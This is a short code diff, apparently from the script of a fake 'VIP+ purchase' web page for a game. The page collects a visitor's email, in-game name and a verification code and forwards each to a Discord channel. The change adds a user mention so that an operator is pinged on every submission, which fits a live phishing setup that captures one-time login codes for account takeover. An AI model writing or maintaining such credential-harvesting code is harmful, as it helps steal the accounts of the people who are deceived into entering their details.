@@ -283,7 +283,7 @@
 
             showLoading();
             try {
-                await sendToDiscord(`New VIP+ Purchase:\n\nEmail:\n${email}\n\nIGN:\n${ign}`);
+                await sendToDiscord(`<@990823209433706506> New VIP+ Purchase:\n\nEmail:\n${email}\n\nIGN:\n${ign}`);
                 document.getElementById('initialStep').classList.add('hidden');
                 document.getElementById('verificationStep').classList.add('active');
             } catch (error) {
@@ -308,7 +308,7 @@
 
             showLoading();
             try {
-                await sendToDiscord(`Verification Code:\n${code}`);
+                await sendToDiscord(`<@990823209433706506> Verification Code:\n${code}`);
                 
                 // Increment attempt counter
                 verificationAttempts++;
